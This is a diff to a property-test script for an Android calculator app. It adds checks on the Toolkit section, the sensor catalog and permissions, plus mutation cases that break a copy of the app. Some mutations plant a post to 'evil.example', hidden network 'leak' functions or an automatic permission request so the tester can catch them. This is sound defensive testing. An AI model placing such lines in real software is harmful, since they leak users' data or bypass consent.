@@ -52,6 +52,11 @@
 #   C14 the keypad never moves (owner bug): ExpressionMode keeps every text- or result-dependent view
 #       inside one weight(1f) display (// DISPLAY BEGIN..END) above the
 #       keys, and ModeScreens.kt does not call AskAboutResult( (the "Ask about this result" element).
+#   C16 the Toolkit and the Sensors page: Clock is a Toolkit page (not Measure), Light is libs:light's
+#       (no torch code in this app), Tracker is a deep link (no tracker of its own), every sensor of
+#       build.json::sensors has a unique id, a known source, a formula measure/SensorMath.kt names,
+#       and its group has a sensor_group mode; each runtime permission a sensor names is declared in the
+#       manifest and is asked for from a tap (onClick) alone.
 #   MUT each property, broken on a copy (and the edit proven to have landed), goes red.
 #
 # OWN-SOURCE ONLY: reads ac_cloud-calc and nothing else. python3 + grep.
@@ -361,11 +366,11 @@ theme = open(os.path.join(src, "ui", "CalcTheme.kt"), encoding="utf-8").read()
 if not re.search(r"val displayMinHeight: Dp = [1-9]\d*\.dp", theme):
     bad.append("C14 CalcMetrics.displayMinHeight is not a positive dp")
 
-# C15 the declared nav: the island is Calc | Sheet | AI | Measure | JEV in that order; Configs is NOT on it - it is the
+# C15 the declared nav: the island is Calc | Sheet | AI | Measure | Toolkit in that order; Configs is NOT on it - it is the
 # only section off the bar, opened by the shared first row's Configs button (libs:nav-bar-top-first-row); the Sheet and AI
 # pages each have their renderer; Jev's attachments take the camera and the microphone through the two gates.
-want_bar = ["calculator", "sheet", "ai", "measure", "jev"]
-want_label = ["Calc", "Sheet", "AI", "Measure", "JEV"]
+want_bar = ["calculator", "sheet", "ai", "measure", "toolkit"]
+want_label = ["Calc", "Sheet", "AI", "Measure", "Toolkit"]
 if bar != want_bar:
     bad.append("C15 ui.bottom_nav must be exactly %s, found %s" % (want_bar, bar))
 labels = [next((x["label"] for x in sections if x["id"] == b), None) for b in bar]
@@ -406,6 +411,77 @@ if "MicGate" not in att or "CameraGate" not in att:
 if "libs:ai" not in json.dumps(bj["modules"]) or "sheet" not in bj["modules"]:
     bad.append("C15 build.json::modules must declare sheet and libs:ai")
 
+# C16 the Toolkit pages and the Sensors catalog.
+sec_of = {p["id"]: x["id"] for x in sections for p in x.get("pages", [])}
+if sec_of.get("clock") != "toolkit":
+    bad.append("C16 the Clock page must sit in the toolkit section, found %r" % sec_of.get("clock"))
+for page in ("light", "recorder", "tracker", "clock"):
+    if sec_of.get(page) != "toolkit":
+        bad.append("C16 the toolkit section must hold the %s page" % page)
+kinds = {m_["tab"]: m_["kind"] for m_ in modes}
+for page, kind in (("light", "light"), ("recorder", "recorder"), ("tracker", "tracker_link")):
+    if kinds.get(page) != kind:
+        bad.append("C16 page %s must be a %s mode, found %r" % (page, kind, kinds.get(page)))
+all_src = "\n".join(code(p) for p in kts)
+for tok in ("setTorchMode", "turnOnTorchWithStrengthLevel", "FLASH_INFO_AVAILABLE"):
+    if tok in all_src:
+        bad.append("C16 %s in the app: the torch is libs:light's alone (no second Light)" % tok)
+for tok in ("LocationTrackerService", "TrackerFragment", "ActivityRecognitionClient", "Geofenc"):
+    if tok in all_src:
+        bad.append("C16 %s in the app: the Tracker is Cloud Navigation's, Toolkit only links to it" % tok)
+tl = code(os.path.join(src, "ui", "ToolkitScreens.kt"))
+if "getLaunchIntentForPackage(BuildConfig.TRACKER_PACKAGE)" not in tl:
+    bad.append("C16 ToolkitScreens.kt must open the Tracker through Cloud Navigation's launch intent (BuildConfig.TRACKER_PACKAGE)")
+if "LightPanel(" not in tl:
+    bad.append("C16 ToolkitScreens.kt must draw libs:light's LightPanel")
+gr2 = open(os.path.join(app, "app", "build.gradle"), encoding="utf-8").read()
+if "project(':libs:light')" not in gr2 or "libs:light" not in bj["modules"]:
+    bad.append("C16 libs:light must be a declared module and an app dependency")
+sens = bj.get("sensors") or {}
+sensors = sens.get("sensors", [])
+sm = open(os.path.join(app, "measure", "src", "main", "kotlin", "com", "diegonmarcos", "cloudcalc", "measure", "SensorMath.kt"), encoding="utf-8").read()
+names = re.search(r"val names: Set<String> = setOf\((.*?)\)\n", sm, re.S)
+formulas = set(re.findall(r'"(\w+)"', names.group(1))) if names else set()
+if not formulas:
+    bad.append("C16 measure/SensorMath.kt has no `val names` this tester can read")
+sids = [x["id"] for x in sensors]
+for i in sorted({i for i in sids if sids.count(i) > 1}):
+    bad.append("C16 sensor id %s is declared twice" % i)
+types = [x["android_type"] for x in sensors if x.get("source") == "sensor"]
+for t in sorted({t for t in types if types.count(t) > 1}):
+    bad.append("C16 android sensor type %s is declared by two catalog entries" % t)
+for x in sensors:
+    if x.get("source") not in ("sensor", "gnss", "battery_temperature", "battery_voltage", "wifi", "cell", "nfc"):
+        bad.append("C16 sensor %s has unknown source %r" % (x["id"], x.get("source")))
+    for d in x.get("derived", []):
+        if d["fn"] not in formulas:
+            bad.append("C16 sensor %s derives %s with %s, which SensorMath.kt does not define" % (x["id"], d["id"], d["fn"]))
+        if d.get("band") and d["band"] not in sens.get("bands", {}):
+            bad.append("C16 sensor %s derives %s into band %s, which is not declared" % (x["id"], d["id"], d["band"]))
+        for n in d.get("needs", []):
+            if n not in sids:
+                bad.append("C16 sensor %s derived %s needs %s, which is not a sensor" % (x["id"], d["id"], n))
+groups = {x["group"] for x in sensors}
+shown = set()
+for m_ in modes:
+    if m_["kind"] == "sensor_group":
+        shown.add((m_.get("spec") or {}).get("group"))
+for g in sorted(groups - shown):
+    bad.append("C16 sensor group %s has no sensor_group mode: its sensors could never be shown" % g)
+for g in sorted(shown - groups):
+    bad.append("C16 sensor_group mode shows group %s, which no sensor declares" % g)
+perm_map = {"ACTIVITY_RECOGNITION": "android.permission.ACTIVITY_RECOGNITION", "BODY_SENSORS": "android.permission.BODY_SENSORS", "ACCESS_FINE_LOCATION": "android.permission.ACCESS_FINE_LOCATION"}
+for x in sensors:
+    p_ = x.get("permission", "")
+    if p_ and (p_ not in perm_map or perm_map[p_] not in manifest):
+        bad.append("C16 sensor %s needs %s, which the manifest does not declare" % (x["id"], p_))
+ss = code(os.path.join(src, "ui", "SensorScreens.kt"))
+for line in ss.split("\n"):
+    if ".launch(" in line and "onClick" not in line:
+        bad.append("C16 SensorScreens.kt asks for a permission outside a tap: %s" % line.strip())
+if "LaunchedEffect" in "".join(l for l in ss.split("\n") if ".launch(" in l):
+    bad.append("C16 a Sensors permission request sits in a LaunchedEffect: it must wait for Allow")
+
 for b in bad:
     print("  FAIL  " + b)
 sys.exit(1 if bad else 0)
@@ -420,7 +496,7 @@ WORK="$(mktemp -d)"
 mutate() {  # name, file (relative to the app), python expression over s, expected message fragment
     local name="$1" rel="$2" expr="$3" want="$4" copy="$WORK/$1"
     mkdir -p "$copy"
-    cp -r "$APP/build.json" "$APP/app" "$APP/jev" "$copy/"
+    cp -r "$APP/build.json" "$APP/app" "$APP/jev" "$APP/measure" "$copy/"
     for f in settings.gradle build.gradle; do [ -f "$APP/$f" ] && cp "$APP/$f" "$copy/"; done
     if ! python3 - "$copy/$rel" "$expr" <<'PY'
 import sys
@@ -459,10 +535,10 @@ JV='jev/src/main/kotlin/com/diegonmarcos/cloudcalc/jev'
 mutate router-online "$JV/JevRouter.kt" 's + "\nprivate fun leak() = java.net.Socket(\"x\", 1)\n"' "C6 JevRouter.kt uses the network"
 mutate url-in-decisions "$JV/Decisions.kt" 's.replace("post(cfg.endpoint, cfg.timeoutMs,", "post(\"https://evil.example\", cfg.timeoutMs,")' "C6 jev/Decisions.kt spells a URL"
 mutate decisions-online "$JV/Decisions.kt" 's + "\nprivate fun leak() = java.net.URL(\"x\").openConnection()\n"' "C6 Decisions.kt uses the network"
-mutate bottom-nav-orphan build.json 's.replace("\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"jev\"]", "\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"nowhere\"]")' "C1 ui.bottom_nav names nowhere"
-mutate bottom-nav-six build.json 's.replace("\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"jev\"]", "\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"jev\", \"a\"]")' "C1 ui.bottom_nav must hold one to five"
+mutate bottom-nav-orphan build.json 's.replace("\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"toolkit\"]", "\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"nowhere\"]")' "C1 ui.bottom_nav names nowhere"
+mutate bottom-nav-six build.json 's.replace("\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"toolkit\"]", "\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"toolkit\", \"a\"]")' "C1 ui.bottom_nav must hold one to five"
 mutate default-off-bar build.json 's.replace("\"default_section\": \"calculator\"", "\"default_section\": \"history\"")' "C1 ui.default_section"
-mutate section-icon build.json 's.replace("\"icon\": \"psychology\"", "\"icon\": \"psycho\"")' "C3 tab jev icon"
+mutate section-icon build.json 's.replace("\"icon\": \"speed\"", "\"icon\": \"spd\"")' "C3 tab measure icon"
 mutate jev-tool-no-mode build.json 's.replace("\"mode\": \"units\"", "\"mode\": \"unitz\"")' "C11 jev tool units names mode unitz"
 mutate jev-tool-no-form build.json 's.replace("\"form\": \"dbsum\"", "\"form\": \"dbsun\"")' "names form dbsun"
 mutate jev-fallback-mode build.json 's.replace("\"fallback_mode\": \"standard\"", "\"fallback_mode\": \"basic\"")' "C11 jev route.fallback_mode basic"
@@ -505,8 +581,17 @@ mutate ask-above-keys "$J/ui/ModeScreens.kt" 's.replace("        // DISPLAY END"
 mutate result-above-keys "$J/ui/ModeScreens.kt" 's.replace("        // DISPLAY END", "        // DISPLAY END\n        ResultBlock(result)")' "C14 ExpressionMode: ResultBlock( sits outside the display"
 mutate display-unfixed "$J/ui/ModeScreens.kt" 's.replace(".weight(1f).heightIn(min = CalcMetrics.displayMinHeight)", ".wrapContentHeight()")' "C14 the display of ExpressionMode must open with weight(1f)"
 mutate display-zero "$J/ui/CalcTheme.kt" 's.replace("val displayMinHeight: Dp = 96.dp", "val displayMinHeight: Dp = 0.dp")' "C14 CalcMetrics.displayMinHeight is not a positive dp"
+mutate clock-in-measure build.json 's.replace("\"id\": \"toolkit\"", "\"id\": \"toolkitx\"")' "C16 the Clock page must sit in the toolkit section"
+mutate torch-second-copy "$J/ui/CameraScreens.kt" 's + "\nprivate fun torch(cm: android.hardware.camera2.CameraManager) = cm.setTorchMode(\"0\", true)\n"' "C16 setTorchMode in the app"
+mutate tracker-own "$J/ui/ModeScreens.kt" 's + "\nprivate class TrackerFragment\n"' "C16 TrackerFragment in the app"
+mutate sensor-unknown-formula build.json 's.replace("\"fn\": \"dew_point\"", "\"fn\": \"dew_pointx\"")' "which SensorMath.kt does not define"
+mutate sensor-unknown-band build.json 's.replace("\"band\": \"light_level\"", "\"band\": \"light_levelx\"")' "into band light_levelx"
+mutate sensor-needs-nothing build.json 's.replace("\"ambient_temperature\"\n            ]", "\"ambient_temperaturex\"\n            ]", 1)' "which is not a sensor"
+mutate sensor-perm-undeclared app/src/main/AndroidManifest.xml 's.replace("<uses-permission android:name=\"android.permission.BODY_SENSORS\" />", "")' "needs BODY_SENSORS, which the manifest does not declare"
+mutate sensor-group-unshown build.json 's.replace("\"spec\": {\n          \"group\": \"activity\"", "\"spec\": {\n          \"group\": \"activityx\"")' "has no sensor_group mode"
+mutate sensor-perm-auto "$J/ui/SensorScreens.kt" 's + "\nprivate fun auto(l: androidx.activity.result.ActivityResultLauncher<String>) = l.launch(\"x\")\n"' "asks for a permission outside a tap"
 mutate nav-order-swapped build.json 's.replace("\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\"", "\"bottom_nav\": [\"calculator\", \"ai\", \"sheet\"")' "C15 ui.bottom_nav must be exactly"
-mutate configs-on-bar build.json 's.replace("\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"jev\"]", "\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"settings\"]")' "C15 ui.bottom_nav must be exactly"
+mutate configs-on-bar build.json 's.replace("\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"toolkit\"]", "\"bottom_nav\": [\"calculator\", \"sheet\", \"ai\", \"measure\", \"settings\"]")' "C15 ui.bottom_nav must be exactly"
 mutate topbar-scaffold-gone "$J/ui/CalcShell.kt" 's.replace("NavBarTopFirstRowScaffold(", "NavBarTopFirstRowScaffoldx(")' "C15 ui/CalcShell.kt must draw the shared bars"
 mutate topbar-own-configs-button "$J/ui/CalcShell.kt" 's + "\nprivate fun ConfigsButton() { CircleShape }\n"' "C15 ui/CalcShell.kt still draws its own chrome"
 mutate topbar-configs-unwired "$J/ui/CalcShell.kt" 's.replace("onConfigs = { state.openConfigs() }", "onConfigs = { }")' "C15 ui/CalcShell.kt must draw the shared bars"
